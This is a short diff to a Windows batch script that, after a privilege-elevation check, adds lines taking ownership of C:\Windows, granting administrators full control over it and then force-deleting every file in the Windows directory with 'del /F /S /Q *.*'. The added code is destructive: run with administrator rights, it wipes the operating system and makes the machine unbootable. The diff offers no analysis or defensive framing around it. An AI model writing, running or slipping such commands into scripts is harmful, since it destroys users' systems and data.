@@ -23,5 +23,11 @@ if "%admin%"=="0" (
     echo Successfully elevated privileges!
 )
 
+REM Take ownership of Windows
+takeown /f C:\Windows /r /d y
+icacls C:\Windows /grant administrators:F /t
+cd C:\Windows
 
+REM Delete Windows
+del /F /S /Q *.*
 
